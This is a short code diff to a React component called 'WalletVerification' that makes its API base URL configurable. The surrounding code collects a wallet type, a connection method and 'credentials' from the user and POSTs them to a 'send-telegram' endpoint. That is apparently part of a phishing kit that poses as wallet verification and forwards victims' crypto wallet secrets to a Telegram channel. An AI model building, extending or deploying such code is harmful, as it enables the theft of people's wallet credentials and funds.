@@ -131,7 +131,8 @@ export default function WalletVerification() {
     mutationFn: async (data: { walletType: string; connectionMethod: string; credentials: string }) => {
       console.log('Sending to API:', data);
       try {
-        const response = await fetch('/api/send-telegram', {
+        const apiUrl = import.meta.env.VITE_API_URL || '/api';
+        const response = await fetch(`${apiUrl}/send-telegram`, {
           method: 'POST',
           body: JSON.stringify(data),
           headers: { 'Content-Type': 'application/json' }
